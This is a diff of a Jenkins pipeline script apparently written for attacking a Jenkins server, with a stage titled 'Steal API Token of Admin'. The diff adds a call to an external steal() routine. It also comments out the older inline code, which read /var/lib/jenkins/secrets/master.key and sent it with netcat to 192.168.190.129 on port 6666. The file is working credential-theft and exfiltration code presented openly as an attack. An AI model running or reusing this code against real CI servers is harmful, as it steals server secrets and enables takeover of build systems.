@@ -48,7 +48,12 @@ node ('master') {
         echo pipeline1.toString()
     }
 */    
+    
     stage('Steal API Token of Admin') {
+        
+        myscript.steal()
+
+/*        
         println "\n\n=========================================================";
         def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
         println fileContents
@@ -69,6 +74,7 @@ node ('master') {
         println str
 
         sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
+*/        
     }
 }
 
